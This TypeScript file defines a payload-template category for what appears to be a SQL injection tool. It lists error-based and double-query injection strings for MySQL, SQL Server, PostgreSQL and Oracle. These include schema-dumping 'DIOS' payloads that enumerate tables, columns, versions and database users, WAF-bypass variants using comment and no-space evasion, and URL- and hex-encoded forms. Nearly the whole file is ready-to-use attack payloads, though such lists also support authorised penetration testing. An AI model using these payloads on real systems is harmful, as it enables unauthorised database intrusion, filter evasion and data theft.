import { TemplateCategory } from '../../types/template';

export const errorDoubleCategory: TemplateCategory = {
  id: 'error-double',
  label: 'Error / Double',
  description: 'Database error and double-query injection templates: XPath, Polygon/MultiPoint, MultiPoint DIOS, Advance Error (MySQL >= 5.5), MadBlood DIOS, Double Query, and RDBMS dialect errors',
  iconName: 'AlertTriangle',
  subcategories: [
    // ========================================================================
    // 1. XPATH EXTRACTVALUE
    // ========================================================================
    {
      id: 'xpath-extractvalue',
      label: 'XPATH EXTRACTVALUE',
      description: 'XPath parsing error messages via ExtractValue() in MySQL 5.1+ and MariaDB',
      templates: [
        {
          id: 'extractvalue-basic',
          name: 'ExtractValue Basic',
          description: 'Triggers an XPath syntax error using ExtractValue with a dummy string marker',
          content: "AND ExtractValue(1, CONCAT(0x7e, '{dummy_value}'))",
          parameters: [
            { id: 'dummy_value', label: 'Dummy String Marker', defaultValue: 'test_syntax_marker', inputType: 'text' }
          ]
        },
        {
          id: 'extractvalue-expression',
          name: 'ExtractValue with Expression',
          description: 'Evaluates an expression inside ExtractValue XPath parser',
          content: 'AND ExtractValue(1, CONCAT(0x7e, ({expression})))',
          parameters: [
            { id: 'expression', label: 'Safe Constant Expression', defaultValue: 'SELECT 1+1', inputType: 'text' }
          ]
        },
        {
          id: 'extractvalue-version',
          name: 'ExtractValue @@version',
          description: 'Extracts database engine version string via XPath error message',
          content: 'AND ExtractValue(1, CONCAT(0x7e, @@version))'
        },
        {
          id: 'extractvalue-database',
          name: 'ExtractValue database()',
          description: 'Extracts current database name via XPath error message',
          content: 'AND ExtractValue(1, CONCAT(0x7e, database()))'
        },
        {
          id: 'extractvalue-tables',
          name: 'ExtractValue Table Enumeration',
          description: 'Extracts table names from information_schema with pagination offset',
          content: 'AND ExtractValue(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT {offset},1)))',
          parameters: [
            { id: 'offset', label: 'Row Offset', defaultValue: '0', inputType: 'text' }
          ]
        },
        {
          id: 'extractvalue-columns',
          name: 'ExtractValue Column Enumeration',
          description: 'Extracts column names for a specified table from information_schema',
          content: 'AND ExtractValue(1, CONCAT(0x7e, (SELECT column_name FROM information_schema.columns WHERE table_name=\'{table_name}\' LIMIT {offset},1)))',
          parameters: [
            { id: 'table_name', label: 'Table Name', defaultValue: 'users', inputType: 'text' },
            { id: 'offset', label: 'Row Offset', defaultValue: '0', inputType: 'text' }
          ]
        }
      ]
    },

    // ========================================================================
    // 2. XPATH UPDATEXML
    // ========================================================================
    {
      id: 'xpath-updatexml',
      label: 'XPATH UPDATEXML',
      description: 'XPath parsing error messages via UpdateXML() in MySQL 5.1+ and MariaDB',
      templates: [
        {
          id: 'updatexml-basic',
          name: 'UpdateXML Basic',
          description: 'Triggers an XPath syntax error using UpdateXML with a dummy string marker',
          content: "AND UpdateXML(1, CONCAT(0x7e, '{dummy_value}'), 1)",
          parameters: [
            { id: 'dummy_value', label: 'Dummy String Marker', defaultValue: 'test_syntax_marker', inputType: 'text' }
          ]
        },
        {
          id: 'updatexml-expression',
          name: 'UpdateXML with Expression',
          description: 'Evaluates an expression inside UpdateXML XPath parser',
          content: 'AND UpdateXML(1, CONCAT(0x7e, ({expression})), 1)',
          parameters: [
            { id: 'expression', label: 'Safe Constant Expression', defaultValue: 'SELECT 1+1', inputType: 'text' }
          ]
        },
        {
          id: 'updatexml-version',
          name: 'UpdateXML @@version',
          description: 'Extracts database version string via UpdateXML error message',
          content: 'AND UpdateXML(1, CONCAT(0x7e, @@version), 1)'
        },
        {
          id: 'updatexml-database',
          name: 'UpdateXML database()',
          description: 'Extracts current schema database name via UpdateXML error message',
          content: 'AND UpdateXML(1, CONCAT(0x7e, database()), 1)'
        },
        {
          id: 'updatexml-tables',
          name: 'UpdateXML Table Enumeration',
          description: 'Extracts table names from information_schema via UpdateXML with offset',
          content: 'AND UpdateXML(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT {offset},1)), 1)',
          parameters: [
            { id: 'offset', label: 'Row Offset', defaultValue: '0', inputType: 'text' }
          ]
        }
      ]
    },

    // ========================================================================
    // 3. POLYGON / MULTIPOINT
    // ========================================================================
    {
      id: 'polygon-multipoint',
      label: 'POLYGON / MULTIPOINT',
      description: 'MySQL spatial geometry function errors (Polygon, MultiPoint, GeometryCollection, MultiLineString)',
      templates: [
        {
          id: 'geom-polygon-basic',
          name: 'Polygon Basic Error',
          description: 'Triggers geometry error via subquery inside polygon() function',
          content: 'AND polygon((SELECT * FROM (SELECT * FROM (SELECT \'{dummy_value}\') a) b))',
          parameters: [
            { id: 'dummy_value', label: 'Dummy Marker', defaultValue: 'polygon_test', inputType: 'text' }
          ]
        },
        {
          id: 'geom-multipoint-basic',
          name: 'MultiPoint Basic Error',
          description: 'Triggers geometry error via subquery inside multipoint() function',
          content: 'AND multipoint((SELECT * FROM (SELECT * FROM (SELECT \'{dummy_value}\') a) b))',
          parameters: [
            { id: 'dummy_value', label: 'Dummy Marker', defaultValue: 'multipoint_test', inputType: 'text' }
          ]
        },
        {
          id: 'geom-geometrycollection',
          name: 'GeometryCollection Error',
          description: 'Spatial function error using geometrycollection() subquery evaluation',
          content: 'AND geometrycollection((SELECT * FROM (SELECT * FROM (SELECT \'{dummy_value}\') a) b))',
          parameters: [
            { id: 'dummy_value', label: 'Dummy Marker', defaultValue: 'geomcoll_test', inputType: 'text' }
          ]
        },
        {
          id: 'geom-multilinestring',
          name: 'MultiLineString Error',
          description: 'Spatial function error using multilinestring() subquery evaluation',
          content: 'AND multilinestring((SELECT * FROM (SELECT * FROM (SELECT \'{dummy_value}\') a) b))',
          parameters: [
            { id: 'dummy_value', label: 'Dummy Marker', defaultValue: 'multiline_test', inputType: 'text' }
          ]
        },
        {
          id: 'geom-polygon-version',
          name: 'Polygon @@version Extraction',
          description: 'Extracts database engine version string via Polygon spatial geometry error',
          content: 'AND polygon((SELECT * FROM (SELECT * FROM (SELECT @@version) a) b))'
        }
      ]
    },

    // ========================================================================
    // 4. MULTIPOINT DIOS
    // ========================================================================
    {
      id: 'multipoint-dios',
      label: 'MULTIPOINT DIOS',
      description: 'Dump-In-One-Shot (DIOS) database enumeration payloads utilizing MultiPoint geometry errors',
      templates: [
        {
          id: 'multipoint-dios-standard',
          name: 'MultiPoint Standard DIOS (Columns & Tables)',
          description: 'Dumps all tables and column names in one shot via MultiPoint geometry error',
          content: 'AND multipoint((SELECT * FROM (SELECT * FROM (SELECT concat(@:=0,(SELECT count(*) FROM information_schema.columns WHERE table_schema=database() AND @:=concat(@,0x0a,table_name,0x3a,column_name)),@)) a) b))'
        },
        {
          id: 'multipoint-dios-tables',
          name: 'MultiPoint Table DIOS',
          description: 'Dumps all table names in current database via MultiPoint error',
          content: 'AND multipoint((SELECT * FROM (SELECT * FROM (SELECT concat(@:=0,(SELECT count(*) FROM information_schema.tables WHERE table_schema=database() AND @:=concat(@,0x0a,table_name)),@)) a) b))'
        },
        {
          id: 'multipoint-dios-version',
          name: 'MultiPoint System Summary DIOS',
          description: 'Dumps version, current database, and user credentials in one MultiPoint call',
          content: 'AND multipoint((SELECT * FROM (SELECT * FROM (SELECT concat(0x7e,@@version,0x7e,database(),0x7e,user())) a) b))'
        }
      ]
    },

    // ========================================================================
    // 5. ADVANCE ERROR BASED (MySQL >= 5.5)
    // ========================================================================
    {
      id: 'advance-error-mysql55',
      label: 'Advance Error Based (MySQL >= 5.5)',
      description: 'Advanced geometric and mathematical error techniques effective in MySQL 5.5+ and 5.6+',
      templates: [
        {
          id: 'advance-exp-overflow',
          name: 'EXP Numeric Overflow (~0)',
          description: 'Triggers DOUBLE value out of range error via bitwise NOT of zero (~0)',
          content: 'AND exp(~(SELECT * FROM (SELECT 1) a))'
        },
        {
          id: 'advance-exp-expression',
          name: 'EXP Overflow with Expression',
          description: 'Reflects evaluated subquery expression inside EXP() numeric overflow error message',
          content: 'AND exp(~(SELECT * FROM (SELECT CONCAT(0x7e, ({expression}))) a))',
          parameters: [
            { id: 'expression', label: 'Expression', defaultValue: 'SELECT version()', inputType: 'text' }
          ]
        },
        {
          id: 'advance-gtid-subset',
          name: 'GTID_SUBSET Error (MySQL >= 5.6)',
          description: 'Triggers malformed GTID set specification error in MySQL 5.6+',
          content: 'AND gtid_subset(CONCAT(0x7e, ({expression})), 1)',
          parameters: [
            { id: 'expression', label: 'Expression', defaultValue: 'SELECT version()', inputType: 'text' }
          ]
        },
        {
          id: 'advance-gtid-subtract',
          name: 'GTID_SUBTRACT Error (MySQL >= 5.6)',
          description: 'Triggers malformed GTID set specification error via gtid_subtract()',
          content: 'AND gtid_subtract(CONCAT(0x7e, ({expression})), 1)',
          parameters: [
            { id: 'expression', label: 'Expression', defaultValue: 'SELECT version()', inputType: 'text' }
          ]
        },
        {
          id: 'advance-st-latfromgeohash',
          name: 'ST_LatFromGeoHash Error (MySQL >= 5.7)',
          description: 'Triggers invalid GeoHash error in MySQL 5.7+ reflecting evaluated data',
          content: 'AND ST_LatFromGeoHash(CONCAT(0x7e, ({expression})))',
          parameters: [
            { id: 'expression', label: 'Expression', defaultValue: 'SELECT version()', inputType: 'text' }
          ]
        }
      ]
    },

    // ========================================================================
    // 6. DIOS BY MADBLOOD (MySQL >= 5.5)
    // ========================================================================
    {
      id: 'dios-madblood',
      label: 'DIOS By MadBlood (MySQL >= 5.5)',
      description: 'Famous DIOS By MadBlood error-based dump payloads for MySQL 5.5+',
      templates: [
        {
          id: 'madblood-polygon-dios',
          name: 'MadBlood Polygon DIOS',
          description: 'Classic MadBlood DIOS payload using polygon() geometry error',
          content: 'AND polygon((SELECT * FROM (SELECT * FROM (SELECT concat(@:=0,(SELECT count(*) FROM `information_schema`.columns WHERE table_schema=database() AND @:=concat(@,0x0a,table_name,0x3a,column_name)),@)) a) b))'
        },
        {
          id: 'madblood-double-query-dios',
          name: 'MadBlood Double Query DIOS',
          description: 'MadBlood DIOS payload using double query count(*) and rand() error',
          content: 'AND (SELECT 1 FROM (SELECT count(*),concat(0x3a,(SELECT concat(@:=0,(SELECT count(*) FROM `information_schema`.columns WHERE table_schema=database() AND @:=concat(@,0x0a,table_name,0x3a,column_name)),@)),0x3a,floor(rand(0)*2)) a FROM information_schema.tables GROUP BY a) b)'
        },
        {
          id: 'madblood-exp-dios',
          name: 'MadBlood EXP DIOS',
          description: 'MadBlood DIOS payload using EXP numeric overflow error',
          content: 'AND exp(~(SELECT * FROM (SELECT concat(@:=0,(SELECT count(*) FROM `information_schema`.columns WHERE table_schema=database() AND @:=concat(@,0x0a,table_name,0x3a,column_name)),@)) a))'
        },
        {
          id: 'madblood-multipoint-dios',
          name: 'MadBlood MultiPoint DIOS',
          description: 'MadBlood DIOS payload using multipoint() geometry error',
          content: 'AND multipoint((SELECT * FROM (SELECT * FROM (SELECT concat(@:=0,(SELECT count(*) FROM `information_schema`.columns WHERE table_schema=database() AND @:=concat(@,0x0a,table_name,0x3a,column_name)),@)) a) b))'
        }
      ]
    },

    // ========================================================================
    // 7. DOUBLE QUERY BASED
    // ========================================================================
    {
      id: 'double-query-based',
      label: 'Double Query Based',
      description: 'Duplicate key error injection using COUNT(*), CONCAT(), FLOOR(), RAND(), and GROUP BY',
      templates: [
        {
          id: 'double-query-classic',
          name: 'Double Query Classic Expression',
          description: 'Classic duplicate key error via floor(rand(0)*2) and group by',
          content: 'AND (SELECT 1 FROM (SELECT count(*), CONCAT(0x7e, ({expression}), 0x7e, floor(rand(0)*2)) x FROM information_schema.tables GROUP BY x) a)',
          parameters: [
            { id: 'expression', label: 'Expression', defaultValue: 'SELECT version()', inputType: 'text' }
          ]
        },
        {
          id: 'double-query-basic',
          name: 'Double Query Synthetic Dummy',
          description: 'Synthetic demonstration of duplicate key error with dummy marker',
          content: "AND (SELECT 1 FROM (SELECT count(*), CONCAT('{dummy_value}', floor(rand(0)*2)) x FROM (SELECT 1 UNION SELECT 2) a GROUP BY x) b)",
          parameters: [
            { id: 'dummy_value', label: 'Dummy Value', defaultValue: 'duplicate_key_marker', inputType: 'text' }
          ]
        },
        {
          id: 'double-query-version',
          name: 'Double Query @@version Extraction',
          description: 'Extracts database engine version string via double query duplicate key error',
          content: 'AND (SELECT 1 FROM (SELECT count(*), CONCAT(0x7e, @@version, 0x7e, floor(rand(0)*2)) x FROM information_schema.tables GROUP BY x) a)'
        },
        {
          id: 'double-query-synthetic-offset',
          name: 'Double Query Offset Pagination',
          description: 'Double query injection retrieving rows sequentially via LIMIT offset',
          content: "AND (SELECT 1 FROM (SELECT count(*), CONCAT((SELECT '{dummy_value}' LIMIT {offset}, 1), 0x3a, floor(rand(0)*2)) x FROM information_schema.columns GROUP BY x) a)",
          parameters: [
            { id: 'dummy_value', label: 'Target Value', defaultValue: 'probe_record', inputType: 'text' },
            { id: 'offset', label: 'Offset Index', defaultValue: '0', inputType: 'text' }
          ]
        }
      ]
    },

    // ========================================================================
    // 8. MSSQL ERRORBASED
    // ========================================================================
    {
      id: 'mssql-errorbased',
      label: 'MSSQL ERRORBASED',
      description: 'Microsoft SQL Server type conversion errors using CONVERT() and CAST() to INT',
      templates: [
        {
          id: 'mssql-convert-version',
          name: 'MSSQL CONVERT @@version',
          description: 'Extracts SQL Server version string by converting to integer type',
          content: 'AND 1 = CONVERT(int, @@version)'
        },
        {
          id: 'mssql-convert-dbname',
          name: 'MSSQL CONVERT db_name()',
          description: 'Extracts current SQL Server database name via conversion error',
          content: 'AND 1 = CONVERT(int, db_name())'
        },
        {
          id: 'mssql-convert-username',
          name: 'MSSQL CONVERT user_name()',
          description: 'Extracts current SQL Server user name via conversion error',
          content: 'AND 1 = CONVERT(int, user_name())'
        },
        {
          id: 'mssql-convert-expr',
          name: 'MSSQL CONVERT Expression',
          description: 'Evaluates an expression inside CONVERT(int, (...))',
          content: 'AND 1 = CONVERT(int, ({expression}))',
          parameters: [
            { id: 'expression', label: 'Expression', defaultValue: 'SELECT 1+1', inputType: 'text' }
          ]
        },
        {
          id: 'mssql-convert-to-int',
          name: 'MSSQL CONVERT Dummy Marker',
          description: 'Triggers conversion error using dummy string marker',
          content: "AND 1 = CONVERT(INT, '{dummy_value}')",
          parameters: [
            { id: 'dummy_value', label: 'Dummy Value', defaultValue: 'mssql_varchar_probe', inputType: 'text' }
          ]
        },
        {
          id: 'mssql-convert-table-offset',
          name: 'MSSQL CONVERT Table Enumeration',
          description: 'Enumerates table names in SQL Server using TOP NOT IN pagination',
          content: 'AND 1 = CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN (SELECT TOP {offset} table_name FROM information_schema.tables)))',
          parameters: [
            { id: 'offset', label: 'Offset Skip Count', defaultValue: '0', inputType: 'text' }
          ]
        }
      ]
    },

    // ========================================================================
    // 9. POSTGRESQL ERROR BASED
    // ========================================================================
    {
      id: 'postgresql-error-based',
      label: 'PostgreSQL Error Based',
      description: 'PostgreSQL type conversion errors using CAST and shorthand :: syntax',
      templates: [
        {
          id: 'postgres-cast-to-int',
          name: 'PostgreSQL CAST to INT',
          description: 'Triggers type conversion error via CAST function in PostgreSQL',
          content: "AND 1 = CAST('{dummy_value}' AS INT)",
          parameters: [
            { id: 'dummy_value', label: 'Dummy Value', defaultValue: 'invalid_int_probe', inputType: 'text' }
          ]
        },
        {
          id: 'postgres-shorthand-cast',
          name: 'PostgreSQL Shorthand Cast (::int)',
          description: 'Triggers type conversion error via PostgreSQL shorthand cast syntax',
          content: "AND 1 = '{dummy_value}'::int",
          parameters: [
            { id: 'dummy_value', label: 'Dummy Value', defaultValue: 'invalid_int_probe', inputType: 'text' }
          ]
        },
        {
          id: 'postgres-type-conversion-expr',
          name: 'PostgreSQL Type Conversion Expression',
          description: 'Evaluates an expression inside CAST in PostgreSQL',
          content: 'AND 1 = CAST(({expression}) AS INT)',
          parameters: [
            { id: 'expression', label: 'Safe Constant Expression', defaultValue: 'SELECT 1+1', inputType: 'text' }
          ]
        },
        {
          id: 'postgres-substring-cast',
          name: 'PostgreSQL Substring and CAST',
          description: 'Demonstrates substring slicing prior to type casting in PostgreSQL',
          content: "AND 1 = CAST(SUBSTRING('{dummy_value}', 1, 10) AS INT)",
          parameters: [
            { id: 'dummy_value', label: 'Dummy Value', defaultValue: 'invalid_int_probe', inputType: 'text' }
          ]
        },
        {
          id: 'postgres-error-analysis',
          name: 'PostgreSQL Version Extraction Error',
          description: 'Extracts PostgreSQL version via CAST to INT conversion error',
          content: 'AND 1 = CAST(version() AS INT)'
        }
      ]
    },

    // ========================================================================
    // 10. ORACLE ERROR BASED
    // ========================================================================
    {
      id: 'oracle-error-based',
      label: 'Oracle Error Based',
      description: 'Oracle database XMLType, CTXSYS, UTL_INADDR, and ORDSYS error-handling patterns',
      templates: [
        {
          id: 'oracle-xmltype-conversion',
          name: 'XMLType Conversion Analysis',
          description: 'Demonstrates XMLType constructor parsing in Oracle',
          content: "AND 1 = XMLType('<?xml version=\"1.0\"?><root>' || ({expression}) || '</root>')"
        },
        {
          id: 'oracle-ctxsys-analysis',
          name: 'CTXSYS DRITHSX Function Analysis',
          description: 'CTXSYS text indexing component function analysis pattern',
          content: "AND 1 = CTXSYS.DRITHSX.SN(1, '{dummy_value}')",
          parameters: [
            { id: 'dummy_value', label: 'Dummy Value', defaultValue: 'ctxsys_probe', inputType: 'text' }
          ]
        },
        {
          id: 'oracle-utl-inaddr-analysis',
          name: 'UTL_INADDR Analysis (Local Dummy)',
          description: 'Demonstrates UTL_INADDR syntax structure with local dummy value',
          content: "AND 1 = UTL_INADDR.GET_HOST_NAME('{dummy_value}')",
          parameters: [
            { id: 'dummy_value', label: 'Local Host Identifier', defaultValue: 'localhost', inputType: 'text' }
          ]
        },
        {
          id: 'oracle-ordsys-analysis',
          name: 'ORDSYS ORD_DICOM Analysis',
          description: 'ORDSYS multimedia component function analysis structure',
          content: "AND 1 = ORDSYS.ORD_DICOM.GETMAPPINGXPATH('{dummy_value}', 'dummy', 'dummy')",
          parameters: [
            { id: 'dummy_value', label: 'Dummy Value', defaultValue: 'ordsys_probe', inputType: 'text' }
          ]
        },
        {
          id: 'oracle-runtime-analysis',
          name: 'Oracle TO_NUMBER Error Analysis',
          description: 'Demonstrates ORA-01722 invalid number conversion error in Oracle',
          content: "AND 1 = TO_NUMBER('{dummy_value}')",
          parameters: [
            { id: 'dummy_value', label: 'Non-Numeric String', defaultValue: 'invalid_number', inputType: 'text' }
          ]
        }
      ]
    },

    // ========================================================================
    // 11. WAF BYPASS ERROR / DOUBLE
    // ========================================================================
    {
      id: 'waf-error-double',
      label: 'WAF Bypass Error / Double',
      description: 'Error-based and double-query patterns adapted with inline comments and space-evasion delimiters',
      templates: [
        {
          id: 'waf-extractvalue-inline-comment',
          name: 'WAF ExtractValue (Inline Comments)',
          description: 'Replaces spaces with inline comments (/**/) around ExtractValue tokens',
          content: "/**/AND/**/ExtractValue(1,CONCAT(0x7e,'{dummy_value}'))",
          parameters: [
            { id: 'dummy_value', label: 'Dummy Value', defaultValue: 'waf_probe', inputType: 'text' }
          ]
        },
        {
          id: 'waf-extractvalue-version-comment',
          name: 'WAF ExtractValue (Version Comment)',
          description: 'Encloses ExtractValue call in MySQL version-specific comment (/*!50000... */)',
          content: "/*!50000AND*//*!50000ExtractValue(1,CONCAT(0x7e,'{dummy_value}'))*/",
          parameters: [
            { id: 'dummy_value', label: 'Dummy Value', defaultValue: 'waf_probe', inputType: 'text' }
          ]
        },
        {
          id: 'waf-updatexml-nospace',
          name: 'WAF UpdateXML (Zero Space)',
          description: 'Compact UpdateXML pattern without standard space characters',
          content: "AND(UpdateXML(1,CONCAT(0x7e,'{dummy_value}'),1))",
          parameters: [
            { id: 'dummy_value', label: 'Dummy Value', defaultValue: 'waf_probe', inputType: 'text' }
          ]
        },
        {
          id: 'waf-updatexml-version-comment',
          name: 'WAF UpdateXML (Version Comment)',
          description: 'Encloses UpdateXML call in MySQL version-specific comment (/*!50000... */)',
          content: "/*!50000AND*//*!50000UpdateXML(1,CONCAT(0x7e,'{dummy_value}'),1)*/",
          parameters: [
            { id: 'dummy_value', label: 'Dummy Value', defaultValue: 'waf_probe', inputType: 'text' }
          ]
        },
        {
          id: 'waf-double-query-comment',
          name: 'WAF Double Query (Inline Comments)',
          description: 'Replaces whitespace in double-query subquery with inline comments (/**/)',
          content: "/**/AND/**/(SELECT/**/1/**/FROM/**/(SELECT/**/count(*),CONCAT(0x7e,'{dummy_value}',0x7e,floor(rand(0)*2))x/**/FROM/**/information_schema.tables/**/GROUP/**/BY/**/x)a)",
          parameters: [
            { id: 'dummy_value', label: 'Dummy Value', defaultValue: 'waf_probe', inputType: 'text' }
          ]
        },
        {
          id: 'waf-double-query-nospace',
          name: 'WAF Double Query (Zero Space / Parentheses)',
          description: 'Double query pattern eliminating spaces using parentheses grouping',
          content: "AND(SELECT(1)FROM(SELECT(count(*)),CONCAT(0x7e,'{dummy_value}',0x7e,floor(rand(0)*2))x(FROM(information_schema.tables)GROUP(BY(x)))a))",
          parameters: [
            { id: 'dummy_value', label: 'Dummy Value', defaultValue: 'waf_probe', inputType: 'text' }
          ]
        }
      ]
    },

    // ========================================================================
    // 12. URL ENCODED ERROR / DOUBLE
    // ========================================================================
    {
      id: 'url-error-double',
      label: 'URL Encoded Error / Double',
      description: 'Fully URL-encoded error-based and double-query injection templates for HTTP parameter testing',
      templates: [
        {
          id: 'url-extractvalue-encoded',
          name: 'URL Encoded ExtractValue Basic',
          description: 'Full percent-encoded representation of ExtractValue error query',
          content: "%27%20AND%20ExtractValue(1,%20CONCAT(0x7e,%20%27{dummy_value}%27))--%20-",
          parameters: [
            { id: 'dummy_value', label: 'Dummy Value', defaultValue: 'url_probe', inputType: 'text' }
          ]
        },
        {
          id: 'url-updatexml-encoded',
          name: 'URL Encoded UpdateXML Basic',
          description: 'Full percent-encoded representation of UpdateXML error query',
          content: "%27%20AND%20UpdateXML(1,%20CONCAT(0x7e,%20%27{dummy_value}%27),%201)--%20-",
          parameters: [
            { id: 'dummy_value', label: 'Dummy Value', defaultValue: 'url_probe', inputType: 'text' }
          ]
        },
        {
          id: 'url-double-query-encoded',
          name: 'URL Encoded Double Query',
          description: 'Full percent-encoded representation of double query duplicate key injection',
          content: "%27%20AND%20(SELECT%201%20FROM%20(SELECT%20count(*),%20CONCAT(0x7e,%20%27{dummy_value}%27,%200x7e,%20floor(rand(0)*2))%20x%20FROM%20information_schema.tables%20GROUP%20BY%20x)%20a)--%20-",
          parameters: [
            { id: 'dummy_value', label: 'Dummy Value', defaultValue: 'url_probe', inputType: 'text' }
          ]
        },
        {
          id: 'url-double-encode-extractvalue',
          name: 'Double URL Encoded ExtractValue (%2520)',
          description: 'Double percent-encoded ExtractValue pattern for testing multi-tier decoders (%2520)',
          content: "%2527%2520AND%2520ExtractValue(1,%2520CONCAT(0x7e,%2520%2527{dummy_value}%2527))--%2520-",
          parameters: [
            { id: 'dummy_value', label: 'Dummy Value', defaultValue: 'url_probe', inputType: 'text' }
          ]
        }
      ]
    },

    // ========================================================================
    // 13. HEX DECODED ERROR / DOUBLE
    // ========================================================================
    {
      id: 'hex-error-double',
      label: 'Hex Decoded Error / Double',
      description: 'Error-based templates using UNHEX() and hexadecimal representations to eliminate quotation marks',
      templates: [
        {
          id: 'hex-extractvalue-unhex',
          name: 'Hex UNHEX ExtractValue (Quoteless)',
          description: 'Eliminates quotation marks by decoding hex string through UNHEX() in ExtractValue',
          content: "AND ExtractValue(1, CONCAT(0x7e, UNHEX('{hex_encoded_value}')))",
          parameters: [
            { id: 'hex_encoded_value', label: 'Hex String (e.g. 74657374)', defaultValue: '74657374', inputType: 'text' }
          ]
        },
        {
          id: 'hex-updatexml-unhex',
          name: 'Hex UNHEX UpdateXML (Quoteless)',
          description: 'Eliminates quotation marks by decoding hex string through UNHEX() in UpdateXML',
          content: "AND UpdateXML(1, CONCAT(0x7e, UNHEX('{hex_encoded_value}')), 1)",
          parameters: [
            { id: 'hex_encoded_value', label: 'Hex String (e.g. 74657374)', defaultValue: '74657374', inputType: 'text' }
          ]
        },
        {
          id: 'hex-double-query-literal',
          name: 'Hex Literal Double Query (0x...)',
          description: 'Double query using direct hex literal token instead of quoted string',
          content: "AND (SELECT 1 FROM (SELECT count(*), CONCAT(0x7e, 0x{hex_encoded_value}, 0x7e, floor(rand(0)*2)) x FROM information_schema.tables GROUP BY x) a)",
          parameters: [
            { id: 'hex_encoded_value', label: 'Hex Literal (e.g. 74657374)', defaultValue: '74657374', inputType: 'text' }
          ]
        },
        {
          id: 'hex-postgres-decode',
          name: 'PostgreSQL Hex Decode to INT',
          description: 'Decodes hex representation via decode() function in PostgreSQL type conversion error',
          content: "AND 1 = CAST(convert_from(decode('{hex_encoded_value}', 'hex'), 'UTF8') AS INT)",
          parameters: [
            { id: 'hex_encoded_value', label: 'Hex Encoded String', defaultValue: '74657374', inputType: 'text' }
          ]
        },
        {
          id: 'hex-mssql-convert',
          name: 'MSSQL Binary Hex CONVERT to INT',
          description: 'Converts raw hexadecimal binary sequence directly to integer in SQL Server',
          content: "AND 1 = CONVERT(INT, 0x{hex_encoded_value})",
          parameters: [
            { id: 'hex_encoded_value', label: 'Hex Byte String', defaultValue: '74657374', inputType: 'text' }
          ]
        }
      ]
    }
  ]
};
